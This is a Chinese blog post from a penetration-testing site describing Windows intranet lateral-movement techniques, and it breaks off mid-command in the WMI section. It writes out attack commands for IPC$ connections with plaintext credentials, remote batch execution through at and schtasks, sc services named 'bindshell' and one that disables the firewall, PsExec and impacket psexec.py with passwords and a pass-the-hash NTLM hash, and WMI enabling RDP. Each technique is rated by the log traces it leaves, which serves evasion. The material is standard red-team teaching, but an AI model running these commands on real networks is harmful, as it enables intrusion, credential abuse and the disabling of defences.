---
title: 内网渗透横向移动技巧 - 渗透测试中心
url: https://www.cnblogs.com/backlion/p/18616289
source: 博客园 - 渗透测试中心
date: 2024-12-20
fetch_date: 2025-10-06T19:38:15.320510
---

# 内网渗透横向移动技巧 - 渗透测试中心

[![](https://img2024.cnblogs.com/blog/35695/202509/35695-20250929100304557-587378723.jpg)](https://qoder.com/)

* [![博客园logo](//assets.cnblogs.com/logo.svg)](https://www.cnblogs.com/ "开发者的网上家园")
* [会员](https://cnblogs.vip/)
* [众包](https://www.cnblogs.com/cmt/p/18500368)
* [新闻](https://news.cnblogs.com/)
* [博问](https://q.cnblogs.com/)
* [闪存](https://ing.cnblogs.com/)
* [赞助商](https://www.cnblogs.com/cmt/p/19081960)
* [HarmonyOS](https://harmonyos.cnblogs.com/)
* [Chat2DB](https://chat2db-ai.com/)

* ![搜索](//assets.cnblogs.com/icons/search.svg)
  ![搜索](//assets.cnblogs.com/icons/enter.svg)
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    所有博客
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    当前博客
* [![写随笔](//assets.cnblogs.com/icons/newpost.svg)](https://i.cnblogs.com/EditPosts.aspx?opt=1 "写随笔")
  [![我的博客](//assets.cnblogs.com/icons/myblog.svg)](https://passport.cnblogs.com/GetBlogApplyStatus.aspx "我的博客")
  [![短消息](//assets.cnblogs.com/icons/message.svg)](https://msg.cnblogs.com/ "短消息")
  ![简洁模式](//assets.cnblogs.com/icons/lite-mode-on.svg)

  [![用户头像](//assets.cnblogs.com/icons/avatar-default.svg)](https://home.cnblogs.com/)

  [我的博客](https://passport.cnblogs.com/GetBlogApplyStatus.aspx)
  [我的园子](https://home.cnblogs.com/)
  [账号设置](https://account.cnblogs.com/settings/account)
  [会员中心](https://vip.cnblogs.com/my)
  简洁模式 ...
  退出登录

  [注册](https://account.cnblogs.com/signup)
  登录

[![返回主页](/skins/custom/images/logo.gif)](https://www.cnblogs.com/backlion/)

# [渗透测试中心](https://www.cnblogs.com/backlion)

##

* [博客园](https://www.cnblogs.com/)
* [首页](https://www.cnblogs.com/backlion/)
* [新随笔](https://i.cnblogs.com/EditPosts.aspx?opt=1)
* [联系](https://msg.cnblogs.com/send/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83)
* [管理](https://i.cnblogs.com/)
* 订阅
  [![订阅](/skins/coffee/images/xml.gif)](https://www.cnblogs.com/backlion/rss/)

# [内网渗透横向移动技巧](https://www.cnblogs.com/backlion/p/18616289 "发布于 2024-12-19 09:04")

在正常情况中，横向移动是在已经获取了足够的权限的情况下进行横向移动，下面中的方法大部分也需要高权限的操作。

<https://www.freebuf.com/articles/network/251364.html>

内网横向移动分为三种情况：

1.在VPN环境中进行横向移动；

2.在socks代理环境中进行横向移动；

3.在远程木马的环境中进行横向移动；

### 文件传输-前期准备

在进行横向移动的过程中，我们首先应该考虑的是文件传输方案，对之后向攻击目标部署攻击载荷或其他文件提供便利。

#### 网络共享

在windows系统中，网络共享功能可以实现局域网之间的文件共享。提供有效的用户凭据，就可以将文件从一台机器传输到另一台机器。

获取到windows中系统默认开启的网络共享。

> net share

在实战中，往往会使用IPC$连接，而IPC$连接需要两个要求。

1.远程主机开启了IPC连接；

2.远程主机的139端口和445端口开放；

> net use \\10.10.10.10\IPC$ "admin!@#456" /user:"administrator"

此时，如果你具备足够权限的凭据，即可使用dir或者copy命令查看目标主机的信息。

**安全性考虑：这些指令是在本地执行，远程的命令，因此不会在远程连接的主机留下日志信息，因此是比较安全。**

#### 搭建SMB服务器

<https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E9%80%9A%E8%BF%87%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%BC%80%E5%90%AFWindows%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%8C%BF%E5%90%8D%E8%AE%BF%E9%97%AE%E5%85%B1%E4%BA%AB>

SMB（server message block，服务器消息块），又称CIFS（网络文件共享系统），基于应用层网络传输协议，一般使用NetBIOS协议或者TCP发送，使用139或445端口。

创建一个双方都可以访问的SMB服务器，在内网渗透中，让受害主机远程加载木马等操作控制目标主机。

#### CIFS协议和SMB协议的区别

\*\*关于对CIFS权限的想法：\*\*就是当我们拿下了一台机器，然后这台机器存在约束委派或者白银票据这些漏洞的话，通过操作获得到了域控的cifs权限，那就可以使用impacket工具包里面的工具类似psexec.py、smbexec.py之类的脚本，然后使用-no-pass -k参数通过读取到本地的票据直接连接上域控获取到权限。

但是impacket工具包在使用-no-pass -k参数的时候检测的是.ccache票据，在windows上使用的是.kirbi结尾的票据，因此无法成功。在linux上可以成功。

如果能够获取到域控的cifs权限，修改一下impacket工具，或者通过编写其他工具，通过CIFS权限就可以直接拿下域控。

### 计划任务

**使用VPN和socks方式执行方式相同。**

一般来说，需要获取到管理员的凭据才可以进行计划任务的执行。

通过搭建SMB服务器或者建立共享连接，使目标机器下载运行脚本，然后建立计划任务来执行脚本加载木马等。

当目标系统版本<window2012时，使用at：

> net use \\192.168.3.21\ipc$ "Admin12345" /user:god.org\administrator # 建立ipc连接
>
> copy add.bat \192.168.3.21\c$ #拷贝执行文件到目标机器
>
> at \\192.168.3.21 15:47 c:\add.bat #添加计划任务

当目标系统版本>=windows2012时，使用schtasks：

> net use \\192.168.3.32\ipc$ "admin!@#45" /user:god.org\administrator # 建立ipc连接
>
> copy add.bat \\192.168.3.32\c$ #复制文件到其C盘
>
> schtasks /create /s 192.168.3.32 /ru "SYSTEM" /tn adduser /sc DAILY /tr c:\add.bat /F #创建adduser任务对应执行文件

/s：指定要链接的系统；/ru：指定计划任务运行的用户权限；/tn：指定创建的计划任务的名称；

/sc：指定计划任务执行的频率；/tr：指定计划任务运行的程序路径；/F：如果指定任务存在，则强制创建；

/mo：指定计划任务执行周期；

> schtasks /query /s 10.10.10.10 /TN c #查看计划任务c状态
>
> schtasks /run /s 192.168.3.32 /tn adduser /i #运行adduser任务
>
> schtasks /delete /s 192.168.3.21 /tn adduser /f#删除adduser任务

![](https://img2023.cnblogs.com/blog/1049983/202412/1049983-20241219090233771-1402124659.png)

注意计划任务执行的程序是在后台执行，没有回显。

在日志方面，只要进行了远程连接操作，使用IP的话就是NTLM认证数据包，使用域名或者机器名就是Kerberos认证数据包。

![](https://img2023.cnblogs.com/blog/1049983/202412/1049983-20241219090234530-681098702.png)

![](https://img2023.cnblogs.com/blog/1049983/202412/1049983-20241219090235457-769930446.png)

计划任务的添加、删除、执行等操作也都是在目标主机中有所体现。

![](https://img2023.cnblogs.com/blog/1049983/202412/1049983-20241219090236525-1115878997.png)

1. Microsoft-Windows-TaskScheduler/Operational：这个事件日志记录了计划任务的操作、创建、修改和删除等活动。你可以在Windows事件查看器（Event Viewer）中找到这个日志。路径为：Event Viewer -> Applications and Services Logs -> Microsoft -> Windows -> TaskScheduler -> Operational。
2. Microsoft-Windows-TaskScheduler/Maintenance：这个事件日志用于记录计划任务的执行情况，包括任务的开始、完成和错误信息等。同样，在Windows事件查看器中，你可以找到这个日志。路径为：Event Viewer -> Applications and Services Logs -> Microsoft -> Windows -> TaskScheduler -> Maintenance。

**安全性考虑：计划任务虽然是在远程执行，但是会在目标主机建立一个计划任务进程，并且该进程也会在目标主机执行文件，这些行为都会在目标主机留下日志记录，因此较为危险。**

### 系统服务

**使用VPN和socks方式执行方式相同。**

还可以通过在远程主机上创建系统服务的方式，在远程主机上运行指定的程序或者命令。

这样的方式需要两端主机的管理员权限。

> sc \\[主机名/IP] create [servicename] binpath= "[path]" #创建计划任务启动程序
>
> sc \\10.10.10.10 create bindshell binpath= "c:\bind.exe"

注意这里的格式，“=”后面是必须空一格的，否则会出现错误。

启动服务

> sc \\10.10.10.10 start bindshell

删除服务

> sc \\[host] delete [servicename] #删除服务

我们还可以通过设置服务来关闭防火墙：

> sc \\WIN-ENS2VR5TR3N create unablefirewall binpath= "netsh advfirewall set allprofiles state off"
>
> sc \\WIN-ENS2VR5TR3N start unablefirewall

![](https://img2023.cnblogs.com/blog/1049983/202412/1049983-20241219090237132-699104459.png)

在日志方面，只要进行了远程连接操作，使用IP的话就是NTLM认证数据包，使用域名或者机器名就是Kerberos认证数据包。

![](https://img2023.cnblogs.com/blog/1049983/202412/1049983-20241219090237821-930576979.png)

系统服务方面的日志也会留下痕迹。

![](https://img2023.cnblogs.com/blog/1049983/202412/1049983-20241219090238554-1944894495.png)

**安全性考虑：使用创建系统服务的方式，会在远程主机上创建服务，会在目标主机留下日志记录，因此较为危险。**

### PSEXEC

**使用VPN和socks方式执行方式相同。**

**psTools**

psexec是通过SMB连接到服务端的Admin$共享，并释放名为“psexesvc.exe”的二进制文件，然后注册名为“PSEXEC”服务，当命令执行时会通过该服务启动相应的程序执行命令并回显。运行结束后PSEXESVC服务会被删除。

因此，运行psexec需要的条件：

1.目标主机开启Admin$共享；

2.开启139或者445端口，以运行SMB；

3.需要目标主机的权限，创建服务；

> PsExec.exe -accepteula \\192.168.52.138 -u god\liukaifeng01 -p Liufupeng123 -i -s cmd.exe
>
> -accepteula：第一次运行psexec会弹出确认框，使用该参数就不会弹出确认框

-u：用户名

-p：密码

-s：以system权限运行运程进程，获得一个system权限的交互式shell。如果不使用该参数，会获得一个连接所用用户权限的shell

**impacket包**

Psexec.py允许你在远程Windows系统上执行进程，复制文件，并返回处理输出结果。此外，它还允许你直接使用完整的交互式控制台执行远程shell命令（不需要安装任何客户端软件）。

> python psexec.py [[domain/] username [: password] @] [Target IP Address]
>
> python psexec.py VVVV1/admins:User\!@#45@10.10.10.10

# 通过哈希密码连接获得目标域用户交互式shell

> python psexec.py -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@192.168.3.21

python文件和exe文件的命令相同。

![](https://img2023.cnblogs.com/blog/1049983/202412/1049983-20241219090239237-2087541183.png)

使用psexec时，不仅会在域控产生登录日志，还会在目标机器中产生日志信息。

事件ID：7045

使用官方的PSEXEC TOOLS

![](https://img2023.cnblogs.com/blog/1049983/202412/1049983-20241219090240092-1119327909.png)

使用impacket包中的PSEXEC工具进行连接时，发现会自动修改生成的服务名称（对服务有一定的隐藏作用）

![](https://img2023.cnblogs.com/blog/1049983/202412/1049983-20241219090240961-955973561.png)

**安全性分析：psexec在执行时不仅会上传一个文件，还会创建一个服务，这些都是会被目标主机进行日志记录的，因此比较危险。**

### WMI

**使用VPN和socks方式执行方式相同。**

WMI的全名为（Windows Management Instrumentation，Windows管理规范），用户可以通过WMI管理本地和远程的计算机。WMI使用的协议是DCOM（分布式组件对象模型）和WinRM（Windows远程管理）。

运行WMI需要的条件：

1.远程主机的WMI服务为开启状态；

2.双方主机打开并放行135端口；

在windows上可以使用wmic.exe和PowerShell Cmdlet来使用WMI数据和执行WMI方法。

> wmic /node:192.168.183.130 /USER:administrator PATH win32\_terminalservicesetting WHERE (\_\_Class!="") CALL SetAllowTSConnections 1
>
> // wmic /node:"[full machine name]" /USER:"[domain]\[username]" PATH win32\_terminalservicesetting WHERE (\_\_C...